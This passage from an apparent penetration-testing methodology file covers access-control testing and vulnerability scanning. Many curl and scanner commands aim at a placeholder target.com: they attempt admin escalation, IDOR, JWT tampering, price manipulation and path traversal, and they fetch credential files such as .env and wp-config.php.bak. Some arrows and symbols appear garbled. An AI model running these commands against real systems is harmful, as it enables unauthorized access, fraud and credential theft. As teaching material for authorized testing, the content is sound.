curl -H \"Cookie: session=regular_user\" https://target.com/admin
curl -H \"Cookie: session=regular_user\" https://target.com/admin/users
curl -H \"Cookie: session=regular_user\" -X POST https://target.com/admin/users -d '{\"role\":\"admin\"}'

# Test hidden admin parameters:
curl -H \"Cookie: session=user\" https://target.com/profile -d \"username=test&role=admin\"
curl -H \"Cookie: session=user\" https://target.com/settings -d \"is_admin=1\"

# HTTP method override:
curl -X POST -H \"X-HTTP-Method-Override: PUT\" https://target.com/api/user/100
curl -X GET -H \"X-HTTP-Method-Override: DELETE\" https://target.com/api/user/100

# Parameter pollution:
/api/user?id=100&id=1&role=admin
```

4. Path Traversal and Forced Browsing:
```bash
# Test access to admin paths:
/admin/
/administrator/
/moderator/
/manage/
/control-panel/
/.env
/backup/
/config/

# Test with wordlists:
gobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/common.txt -c \"SESSIONID=user_session\" -t 50

# Test different HTTP methods:
curl -X GET https://target.com/admin  # 403 Forbidden
curl -X POST https://target.com/admin  # May allow access
curl -X OPTIONS https://target.com/admin
curl -X TRACE https://target.com/admin

# Case sensitivity bypass:
/Admin
/ADMIN
/aDmIn
```

5. API Authorization Testing:
```bash
# Test API endpoints without authentication:
curl https://api.target.com/users
curl https://api.target.com/admin/settings

# Test with invalid/expired tokens:
curl -H \"Authorization: Bearer expired_token\" https://api.target.com/users
curl -H \"Authorization: Bearer invalid\" https://api.target.com/users

# Test GraphQL authorization:
curl -X POST https://api.target.com/graphql \\
  -H \"Content-Type: application/json\" \\
  -d '{\"query\": \"{users{id email password_hash}}\"}'

# REST API IDOR:
curl -H \"Authorization: Bearer userA_token\" https://api.target.com/api/v1/invoices/100
curl -H \"Authorization: Bearer userA_token\" https://api.target.com/api/v1/invoices/101  # Different user

# Mass assignment vulnerabilities:
curl -X POST https://api.target.com/api/users -H \"Authorization: Bearer user_token\" \\
  -d '{\"username\":\"test\",\"email\":\"test@test.com\",\"role\":\"admin\"}'
```

6. JWT Authorization Bypass:
```bash
# Modify JWT claims without re-signing:
# Original: {\"sub\":\"user@test.com\",\"role\":\"user\"}
# Modified: {\"sub\":\"user@test.com\",\"role\":\"admin\"}

# Use jwt_tool to test authorization:
python3 jwt_tool.py <JWT> -T

# Test JWT with modified user ID:
# Decode, change \"user_id\": 100 โ 101, re-encode without signature

# Test privilege escalation in JWT:
# {\"admin\": false} โ {\"admin\": true}
# {\"permissions\": [\"read\"]} โ {\"permissions\": [\"read\",\"write\",\"delete\"]}
```

7. Business Logic Access Control Flaws:
```bash
# Test workflow bypasses:
# Step 1: Add item to cart
# Step 2: Proceed to checkout
# Step 3: Skip directly to order confirmation without payment

# Multi-step process bypass:
# Registration โ Email verification โ Profile complete
# Try accessing profile completion without email verification

# State manipulation:
# Order status: pending โ shipped (without payment)
# Account status: disabled โ enabled
# Trial period: expired โ active

# Price manipulation:
curl -X POST https://target.com/checkout \\
  -d '{\"item_id\":123,\"quantity\":1,\"price\":0.01}'  # Original price $100

# Discount code stacking:
# Apply multiple discount codes beyond intended limits
```

8. File Upload Authorization:
```bash
# Test file upload access control:
# Upload as User A to User B's directory:
curl -X POST https://target.com/upload \\
  -F \"file=@test.txt\" \\
  -F \"user_id=101\" \\  # Different user's ID
  -H \"Cookie: session=userA\"

# Test file download authorization:
curl https://target.com/download?file=../../other_user/private.pdf

# Test file deletion authorization:
curl -X DELETE https://target.com/api/files/12345 -H \"Cookie: session=userA\"
# File belongs to User B
```

9. Function-Level Access Control:
```bash
# Test privileged functions with low-privilege account:
# User management functions:
curl -X POST https://target.com/api/users/delete -d \"user_id=100\" -H \"Cookie: session=user\"
curl -X POST https://target.com/api/users/promote -d \"user_id=100&role=admin\" -H \"Cookie: session=user\"

# System configuration functions:
curl -X PUT https://target.com/api/settings -d \"maintenance_mode=true\" -H \"Cookie: session=user\"

# Reporting functions:
curl https://target.com/api/reports/all_users -H \"Cookie: session=user\"
curl https://target.com/api/export/database -H \"Cookie: session=user\"

# Financial functions:
curl -X POST https://target.com/api/transactions/refund -d \"transaction_id=12345\" -H \"Cookie: session=user\"
```

10. Test Access Control with Burp Suite Autorize:
```bash
# Install Autorize extension:
# 1. Load extension in Burp Suite Extender
# 2. Configure low-privilege user session
# 3. Browse as high-privilege user
# 4. Autorize replays requests with low-privilege session
# 5. Compares responses to detect authorization bypasses

# GitHub: https://github.com/PortSwigger/autorize

# Alternative: Use OWASP ZAP Access Control Testing add-on
```

WHAT TO LOOK FOR:
- **Horizontal IDOR**: User A can access User B's data by changing ID parameters
- **Vertical Privilege Escalation**: Regular user can access admin functions
- **Missing Function-Level Controls**: Admin endpoints accessible without authorization checks
- **Path Traversal**: ../../../ sequences bypass access controls
- **JWT Authorization Bypass**: Modified JWT claims accepted without signature validation
- **API Endpoint Exposure**: Unauthenticated or unauthorized API access
- **Mass Assignment**: Setting unauthorized fields (role=admin) in API requests
- **Business Logic Bypass**: Skipping payment steps, manipulating workflow states
- **File Access Violations**: Reading/writing/deleting other users' files

SECURITY IMPLICATIONS:
- **Data Breach**: IDOR vulnerabilities expose all user data through simple ID enumeration
- **Account Takeover**: Privilege escalation enables attackers to gain administrative access
- **Financial Fraud**: Price manipulation and payment bypass lead to revenue loss
- **Regulatory Non-Compliance**: Data access violations breach GDPR Article 32, HIPAA ยง164.312, SOC 2 CC6.1
- **Reputation Damage**: Public disclosure of access control failures erodes customer trust
- **Insider Threat**: Weak access controls enable malicious insiders to access sensitive data

COMMON PITFALLS:
- **UI-Only Restrictions**: Frontend hides admin buttons but backend allows access
- **API vs Web Different Controls**: Web interface enforces authorization but API does not
- **Client-Side Authorization**: JavaScript checks can be bypassed by direct API calls
- **Sequential IDs vs UUIDs**: UUIDs make enumeration harder but don't replace authorization checks
- **Partial Authorization**: Application checks authentication but not resource ownership
- **Cached Responses**: Authorization failures may still return cached data
- **Middleware Bypass**: Direct file access bypasses application authorization layer

TOOLS REFERENCE:
- **Burp Suite Autorize**: https://github.com/PortSwigger/autorize (Automated access control testing)
- **OWASP ZAP Access Control**: https://www.zaproxy.org/ (Access control scanning)
- **jwt_tool**: https://github.com/ticarpi/jwt_tool (JWT manipulation and testing)
- **Postman**: https://www.postman.com/ (API authorization testing)
- **Insomnia**: https://insomnia.rest/ (REST API client for access control tests)

FURTHER READING:
- OWASP Testing Guide WSTG-ATHZ: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10 A01 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- OWASP Authorization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
- PortSwigger Access Control: https://portswigger.net/web-security/access-control"
    ),
    (
        "Common vulnerability sweeps",
        "OBJECTIVE: Perform comprehensive automated and manual vulnerability scanning across all discovered assets using industry-standard tools and methodologies.

ACADEMIC BACKGROUND:
This step implements NIST SP 800-115 Section 7.3 (Vulnerability Scanning) and aligns with PTES Technical Guidelines Vulnerability Analysis phase. OWASP Top 10:2021 provides a vulnerability prioritization framework. MITRE ATT&CK Initial Access tactics (T1190 - Exploit Public-Facing Application) emphasize identifying exploitable vulnerabilities. CIS Controls 7.1-7.5 mandate continuous vulnerability assessment.

STEP-BY-STEP PROCESS:

1. Network Vulnerability Scanning:
```bash
# OpenVAS comprehensive scan:
# Install: sudo apt install openvas
# Setup: sudo gvm-setup
# Start: sudo gvm-start
# Web UI: https://localhost:9392

# Nessus Professional (commercial):
# Download from https://www.tenable.com/downloads/nessus
# Install and configure scan targets
# Run \"Basic Network Scan\" or \"Web Application Tests\"

# Nmap vulnerability scripts (NSE):
nmap --script vuln target.com
nmap --script \"vuln and safe\" target.com
nmap --script vulners target.com  # CVE detection

# Specific vulnerability checks:
nmap --script smb-vuln-ms17-010 192.168.1.0/24  # EternalBlue
nmap --script ssl-heartbleed target.com
nmap --script http-shellshock --script-args uri=/cgi-bin/test.sh target.com
```

2. Web Application Scanning:
```bash
# Nuclei template-based scanning:
nuclei -u https://target.com -t /root/nuclei-templates/
nuclei -l urls.txt -t cves/ -t vulnerabilities/ -o results.txt
nuclei -u https://target.com -tags cve,owasp,config -severity critical,high

# Update templates:
nuclei -update-templates

# OWASP ZAP active scan:
zap-cli quick-scan --self-contained --start-options \"-config api.disablekey=true\" https://target.com
zap-cli active-scan https://target.com
zap-cli report -o zap_report.html -f html

# Nikto web server scanner:
nikto -h https://target.com -output nikto_scan.html -Format html
nikto -h https://target.com -Tuning 123456789  # All tests
nikto -h https://target.com -ssl -port 443

# WPScan for WordPress:
wpscan --url https://target.com --enumerate u,p,t --api-token <token>
wpscan --url https://target.com --passwords /usr/share/wordlists/rockyou.txt
```

3. SQL Injection Automated Testing:
```bash
# SQLMap comprehensive testing:
sqlmap -u \"https://target.com/page?id=1\" --batch --crawl=3
sqlmap -u \"https://target.com/page?id=1\" --forms --batch --dbs
sqlmap -u \"https://target.com/page?id=1\" --level=5 --risk=3 --threads=10

# Test all parameters from Burp Suite:
sqlmap -r request.txt --batch

# Blind SQL injection with time delays:
sqlmap -u \"https://target.com/page?id=1\" --technique=T --time-sec=5
```

4. SSL/TLS Vulnerability Assessment:
```bash
# testssl.sh comprehensive TLS testing:
testssl.sh https://target.com --html --outfile tls_report.html

# Specific vulnerability checks:
testssl.sh --heartbleed https://target.com
testssl.sh --poodle https://target.com
testssl.sh --sweet32 https://target.com
testssl.sh --robot https://target.com

# SSLScan:
sslscan --show-certificate --no-failed target.com:443

# Nmap SSL scripts:
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-cert,ssl-known-key -p 443 target.com
```

5. Content Management System (CMS) Scanning:
```bash
# WordPress - WPScan:
wpscan --url https://target.com --enumerate vp,vt,u --plugins-detection aggressive

# Joomla - JoomScan:
git clone https://github.com/OWASP/joomscan.git
cd joomscan
perl joomscan.pl -u https://target.com

# Drupal - Droopescan:
pip3 install droopescan
droopescan scan drupal -u https://target.com

# Generic CMS detection:
whatweb https://target.com -v
```

6. Directory and File Enumeration:
```bash
# Gobuster directory brute-forcing:
gobuster dir -u https://target.com/ -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,html,txt,bak

# Feroxbuster recursive scanning:
feroxbuster -u https://target.com/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50 --depth 4

# ffuf for fuzzing:
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ

# Dirsearch:
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u https://target.com -e php,html,js,txt
```

7. Security Misconfiguration Detection:
```bash
# Nuclei misconfigurations:
nuclei -u https://target.com -t misconfigurations/ -t exposures/

# Common misconfigurations to check:
# - Directory listing enabled
curl https://target.com/uploads/ | grep \"Index of\"

# - Server information disclosure
curl -I https://target.com | grep -i \"Server:\\|X-Powered-By\"

# - CORS misconfiguration
curl -H \"Origin: https://evil.com\" -I https://target.com/api | grep -i \"access-control\"

# - Security headers missing:
curl -I https://target.com | grep -i \"strict-transport\\|content-security\\|x-frame\"

# securityheaders.com check:
curl https://securityheaders.com/?q=https://target.com&followRedirects=on
```

8. Sensitive Data Exposure Scanning:
```bash
# Search for exposed credentials:
nuclei -u https://target.com -t exposures/configs/ -t exposures/tokens/

# Common exposed files:
curl https://target.com/.git/config
curl https://target.com/.env
curl https://target.com/config.php.bak
curl https://target.com/.DS_Store
curl https://target.com/wp-config.php.bak
curl https://target.com/.htaccess
curl https://target.com/robots.txt

# GitDorker for exposed repositories:
git clone https://github.com/obheda12/GitDorker.git
python3 GitDorker.py -tf Dorks/alldorksv3 -q target.com -d Dorks/

# TruffleHog for secrets in Git repos:
trufflehog --regex --entropy=False https://github.com/target/repo
```

9. API Security Testing:
```bash
# API endpoint enumeration:
feroxbuster -u https://api.target.com/ -w /usr/share/wordlists/api-routes.txt

# GraphQL introspection:
curl https://target.com/graphql -X POST -H \"Content-Type: application/json\" \\
  -d '{\"query\": \"{__schema{types{name,fields{name}}}}\"}' | jq

# REST API fuzzing:
ffuf -w /usr/share/wordlists/api-endpoints.txt \\
  -u https://api.target.com/v1/FUZZ \\
  -H \"Authorization: Bearer token\" \\
  -mc 200,201,204,301,302,307,401,403

# API rate limiting test:
for i in {1..1000}; do curl https://api.target.com/endpoint -H \"Authorization: Bearer token\"; done
```

10. Authenticated Vulnerability Scanning:
```bash
# Burp Suite authenticated scan:
# 1. Configure browser proxy to Burp (127.0.0.1:8080)
# 2. Login to application manually
# 3. In Burp, right-click target โ Scan
# 4. Enable \"Application login\" in scan configuration

# OWASP ZAP authenticated scan:
# 1. Configure context with authentication
# 2. Define user credentials
# 3. Run active scan within context

# Nuclei with authentication:
nuclei -u https://target.com -H \"Cookie: SESSIONID=abc123\" -t vulnerabilities/

# Custom script for authenticated testing:
cookies=\"PHPSESSID=abc123; user_token=xyz789\"
for url in $(cat endpoints.txt); do
    curl -s -H \"Cookie: $cookies\" \"$url\" | grep -i \"error\\|sql\\|exception\"
done
```

WHAT TO LOOK FOR:
- **Critical CVEs (CVSS 9.0+)**: Remote code execution, authentication bypass, privilege escalation vulnerabilities
- **Unpatched Services**: Outdated software versions with known public exploits (Apache 2.4.49, Log4Shell)
- **OWASP Top 10 Vulnerabilities**: Injection, broken authentication, sensitive data exposure, XXE, broken access control
- **Missing Security Headers**: Content-Security-Policy, X-Frame-Options, Strict-Transport-Security absent
- **Default Credentials**: Unchanged vendor passwords on admin panels, databases, network devices
- **Exposed Sensitive Files**: .git directories, .env files, database backups, configuration files accessible
- **SSL/TLS Weaknesses**: Weak cipher suites, expired certificates, missing HSTS, vulnerable protocols
- **Information Disclosure**: Verbose error messages, stack traces, server version banners
- **Directory Listing Enabled**: File and folder contents exposed without index pages
- **CORS Misconfiguration**: Overly permissive cross-origin policies allowing data theft

SECURITY IMPLICATIONS:
- **Mass Exploitation**: Automated tools enable rapid identification and exploitation across large attack surfaces
- **Low-Hanging Fruit**: Default credentials and exposed files provide immediate access without advanced techniques
- **Compliance Violations**: Unpatched vulnerabilities breach PCI DSS 6.2, HIPAA ยง164.308(a)(5), SOC 2 CC7.1
- **Ransomware Entry**: Unpatched RCE vulnerabilities are primary vectors for ransomware deployment
- **Data Breach**: Exposed configuration files contain database credentials enabling data exfiltration
- **Supply Chain Risk**: Vulnerable third-party components (Log4j, Spring4Shell) affect multiple organizations

COMMON PITFALLS:
- **False Positives**: Automated scanners report vulnerabilities that don't exist or aren't exploitable in context
- **Scanner Limitations**: Tools miss business logic flaws, custom authentication, and zero-day vulnerabilities
- **Rate Limiting/Blocking**: Aggressive scanning triggers WAF blocks, IP bans, account lockouts
- **Environment Differences**: Scanning dev/staging may not reflect production security controls
- **Authenticated Scanning Required**: Many vulnerabilities only exploitable post-authentication
- **Resource Exhaustion**: Heavy scanning can degrade application performance or cause denial of service
- **Legal Concerns**: Unauthorized scanning may violate Computer Fraud and Abuse Act (CFAA) or contracts

TOOLS REFERENCE:
- **Nuclei**: https://github.com/projectdiscovery/nuclei (Template-based vulnerability scanner)
- **OpenVAS**: https://www.openvas.org/ (Open-source vulnerability scanner)
- **Nessus**: https://www.tenable.com/products/nessus (Commercial vulnerability scanner)
- **OWASP ZAP**: https://www.zaproxy.org/ (Web application security scanner)
- **Nikto**: https://github.com/sullo/nikto (Web server scanner)
- **Burp Suite**: https://portswigger.net/burp (Web application testing platform)
- **testssl.sh**: https://github.com/drwetter/testssl.sh (SSL/TLS testing)
- **WPScan**: https://wpscan.com/ (WordPress security scanner)

FURTHER READING:
- NIST SP 800-115: Technical Guide to Information Security Testing and Assessment
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PTES Vulnerability Analysis: http://www.pentest-standard.org/index.php/Vulnerability_Analysis
- SANS Vulnerability Scanning Best Practices: https://www.sans.org/reading-room/whitepapers/testing/
- CIS Controls v8: https://www.cisecurity.org/controls/"
    ),
];